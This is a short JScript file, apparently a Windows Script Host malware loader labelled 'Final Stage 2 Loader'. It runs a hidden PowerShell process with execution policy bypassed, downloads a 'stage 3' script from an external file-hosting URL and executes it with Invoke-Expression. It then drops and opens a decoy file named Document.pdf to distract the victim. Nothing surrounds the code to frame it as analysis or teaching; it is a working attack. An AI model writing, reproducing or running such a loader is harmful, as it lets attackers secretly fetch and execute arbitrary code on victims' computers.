// Final Stage 2 Loader - Direct Priority
var wsh = new ActiveXObject("WScript.Shell");

// Direct Stage 3 (working one)
var stage3Url = "https://a37b157d-8823-4ec3-8447-919c9b91e4e3.usrfiles.com/ugd/a37b15_efcc1ebbd3cd4dc7bf98297714c77239.txt";

var cmd = '-ep Bypass -c "Invoke-Expression (Invoke-WebRequest -Uri \'' + stage3Url + '\' -UseBasicParsing).Content"';

wsh.Run("powershell.exe " + cmd, 0, false);

// Decoy PDF
var decoyCmd = '-ep Bypass -c "Invoke-WebRequest -Uri \'https://www.google.com\' -OutFile \'$env:USERPROFILE\\Downloads\\Document.pdf\'; Start-Process \'$env:USERPROFILE\\Downloads\\Document.pdf\'"';
wsh.Run("powershell.exe " + decoyCmd, 0, false);